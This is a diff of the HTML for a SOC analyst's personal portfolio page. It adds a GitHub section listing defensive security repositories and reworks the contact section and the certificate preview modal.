-            <span class="skill-pill-item">Threat Intelligence (OSINT)</span>
-          </div>
-        </div>
-
-        <!-- Panel 2: Education & Credentials -->
-        <div id="panelAboutEdu" class="about-panel">
-          <h3 class="about-subheading">Academic &amp; Specialized Credentials</h3>
-          <div class="edu-card-ref">
-            <div class="edu-card-header">
-              <div>
-                <h4 class="edu-degree">B.Tech in Electronics &amp; Communication Engineering</h4>
-                <div class="edu-college">Ramachandra College of Engineering (Affiliated with JNTUK)</div>
-              </div>
-              <span class="edu-year-badge">Engineering Graduate</span>
-            </div>
-            <p class="edu-desc">
-              Strong technical engineering foundation covering communication protocols, digital electronics, computer network architectures, and analytical problem solving, directly transitioned into enterprise security operations and cyber defense engineering.
-            </p>
-            <div class="edu-tags-row">
-              <span class="edu-tag-pill">Network Architectures</span>
-              <span class="edu-tag-pill">Communication Protocols</span>
-              <span class="edu-tag-pill">Digital Logic &amp; Systems</span>
-              <span class="edu-tag-pill">CrowdStrike Incident Responder</span>
-              <span class="edu-tag-pill">Google Agentic AI Developer</span>
-            </div>
-          </div>
-        </div>
-
       </div>
     </section>
 
     <!-- =========================================================================
-         CONTACT SECTION
+         19. GITHUB (Security Research & Engineering)
+         ========================================================================= -->
+    <section id="github" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">REPOSITORIES</span>
+          <h2 class="section-heading">Security Research &amp; Engineering</h2>
+          <p class="section-subtext">Selected defensive security projects, detection engineering experiments, and automation workflows hosted on GitHub.</p>
+        </div>
+
+        <div class="github-cards-grid">
+          <div class="github-card">
+            <div class="gh-top">
+              <span class="gh-icon">📂</span>
+              <h4>home-lab-soc</h4>
+            </div>
+            <p>Autonomous SOC investigation system leveraging Python, vector databases (FAISS), and RAG to automate multi-source threat intelligence correlation across Devo and Sentinel APIs.</p>
+            <div class="gh-tags">
+              <span>Python</span>
+              <span>FAISS</span>
+              <span>RAG</span>
+              <span>Sentinel API</span>
+              <span>ATT&amp;CK</span>
+            </div>
+            <a href="https://github.com/karrijayanth65/home-lab-soc" target="_blank" rel="noopener noreferrer" class="gh-link">
+              View Repository on GitHub ↗
+            </a>
+          </div>
+
+          <div class="github-card">
+            <div class="gh-top">
+              <span class="gh-icon">📂</span>
+              <h4>Jayanth-K</h4>
+            </div>
+            <p>Central portfolio repository, defensive security write-ups, incident investigation playbooks, and certified blue-team lab reports.</p>
+            <div class="gh-tags">
+              <span>HTML/CSS/JS</span>
+              <span>Playbooks</span>
+              <span>SC-200</span>
+              <span>SOC Triage</span>
+            </div>
+            <a href="https://github.com/karrijayanth65/Jayanth-K" target="_blank" rel="noopener noreferrer" class="gh-link">
+              View Repository on GitHub ↗
+            </a>
+          </div>
+
+          <div class="github-card">
+            <div class="gh-top">
+              <span class="gh-icon">📂</span>
+              <h4>kql-detection-engineering</h4>
+            </div>
+            <p>Curated repository of custom KQL and Sigma detection rules targeting LOLBins, Scheduled Tasks, Cloud Identity brute forcing, and process masquerading.</p>
+            <div class="gh-tags">
+              <span>KQL</span>
+              <span>Sigma</span>
+              <span>Defender XDR</span>
+              <span>Sysmon</span>
+            </div>
+            <a href="https://github.com/karrijayanth65" target="_blank" rel="noopener noreferrer" class="gh-link">
+              Explore All Repositories ↗
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         20. CONTACT SECTION (Professional & Direct)
          ========================================================================= -->
     <section id="contact" class="content-section">
       <div class="section-container">
-        <div class="contact-card-demo">
-          <h2 class="contact-demo-title">Contact Me</h2>
-          <p class="contact-demo-sub">Interested in discussing real-time threat detection, SOC operations, or security initiatives? Let's connect.</p>
+        <div class="contact-box-container">
+          <span class="section-eyebrow">INITIATE CONTACT</span>
+          <h2 class="contact-heading">Let's Connect</h2>
+          <p class="contact-lead">
+            I am currently exploring opportunities to transition into a <strong>SOC L2 / Security Operations Engineer</strong> role where I can contribute to advanced incident investigation, multi-source log correlation, threat hunting, detection engineering, and defensive security automation.
+          </p>
 
-          <!-- Big Glowing Copy Email Button -->
-          <button class="btn-copy-email-glow" onclick="copyEmail()">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-            </svg>
-            <span>Copy Email 📋</span>
-          </button>
+          <!-- Direct Copy Email Button -->
+          <div class="copy-email-wrap">
+            <button class="btn-copy-email-glow" onclick="copyEmail()">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+              </svg>
+              <span>Copy Email: <strong>karrijayanth65@gmail.com</strong> 📋</span>
+            </button>
+          </div>
 
-          <!-- Two Column Contact Info Grid -->
-          <div class="contact-demo-grid">
-            <!-- Left Column: Direct Info -->
-            <div class="contact-demo-col">
-              <div class="contact-info-group">
-                <span class="contact-info-label">Email</span>
-                <a href="mailto:karrijayanth65@gmail.com" class="contact-info-val">karrijayanth65@gmail.com</a>
-              </div>
-              <div class="contact-info-group">
-                <span class="contact-info-label">Location</span>
-                <span class="contact-info-val">Bengaluru, Karnataka, India</span>
-              </div>
+          <!-- Channel Grid -->
+          <div class="contact-channels-row">
+            <div class="contact-pill">
+              <span class="pill-label">Email</span>
+              <a href="mailto:karrijayanth65@gmail.com" class="pill-val">karrijayanth65@gmail.com</a>
             </div>
-
-            <!-- Right Column: Social Links with Arrows -->
-            <div class="contact-demo-col">
-              <div class="contact-info-group">
-                <span class="contact-info-label">Social Profiles &amp; Resume</span>
-                <div class="social-arrow-links">
-                  <a href="https://www.linkedin.com/in/karri-jayanth/" target="_blank" rel="noopener noreferrer" class="arrow-link">
-                    LinkedIn ↗
-                  </a>
-                  <a href="https://github.com/karrijayanth65/Jayanth-K" target="_blank" rel="noopener noreferrer" class="arrow-link">
-                    GitHub ↗
-                  </a>
-                  <a href="https://app.letsdefend.io/certificate/show/29b276fb-9e4e-4e3c-b181-3319d1684fd4" target="_blank" rel="noopener noreferrer" class="arrow-link">
-                    LetsDefend ↗
-                  </a>
-                  <a href="./assets/resume/Jayanth_Soc-Analyst.pdf" target="_blank" rel="noopener noreferrer" class="arrow-link">
-                    Download Resume ↗
-                  </a>
-                </div>
-              </div>
+            <div class="contact-pill">
+              <span class="pill-label">LinkedIn</span>
+              <a href="https://www.linkedin.com/in/karri-jayanth/" target="_blank" rel="noopener noreferrer" class="pill-val">linkedin.com/in/karri-jayanth ↗</a>
+            </div>
+            <div class="contact-pill">
+              <span class="pill-label">GitHub</span>
+              <a href="https://github.com/karrijayanth65" target="_blank" rel="noopener noreferrer" class="pill-val">github.com/karrijayanth65 ↗</a>
+            </div>
+            <div class="contact-pill">
+              <span class="pill-label">Medium</span>
+              <a href="https://medium.com/@nameisnani2027" target="_blank" rel="noopener noreferrer" class="pill-val">medium.com/@nameisnani2027 ↗</a>
+            </div>
+            <div class="contact-pill">
+              <span class="pill-label">Location</span>
+              <span class="pill-val text-muted">Bengaluru, Karnataka, India</span>
             </div>
           </div>
 
-          <p class="contact-demo-footer">
-            All Rights Reserved by Jayanth Karri • © 2026
-          </p>
+          <footer class="site-footer">
+            <p>&copy; 2026 Jayanth Karri • SOC Analyst &amp; Threat Detection Portfolio • All Rights Reserved</p>
+          </footer>
         </div>
       </div>
     </section>
@@ -613,11 +2378,11 @@
   <!-- =========================================================================
        MODAL (CERTIFICATE PREVIEW)
        ========================================================================= -->
-  <div id="previewModal" class="modal-overlay" onclick="closeModalOnBackdrop(event)">
+  <div id="previewModal" class="modal-overlay" onclick="closeModalOnBackdrop(event)" role="dialog" aria-modal="true" aria-hidden="true">
     <div class="modal-content">
       <div class="modal-header">
-        <h3 id="modalTitle" class="modal-title">Certificate Preview</h3>
-        <button class="modal-close-btn" onclick="closeModal()">✕</button>
+        <h3 id="modalTitle" class="modal-title">Credential Preview</h3>
+        <button class="modal-close-btn" onclick="closeModal()" aria-label="Close modal">&times;</button>
       </div>
       <div id="modalBody" class="modal-body">
         <!-- Injected dynamically via app.js -->
@@ -626,8 +2391,8 @@
   </div>
 
   <!-- Toast Notification -->
-  <div id="toast" class="toast-msg">Email copied to clipboard!</div>
+  <div id="toast" class="toast-msg" role="status" aria-live="polite">Email copied to clipboard!</div>
 
-  <script src="./js/app.js?v=modern_v7"></script>
+  <script src="./js/app.js?v=premium_soc_v2"></script>
 </body>
 </html>
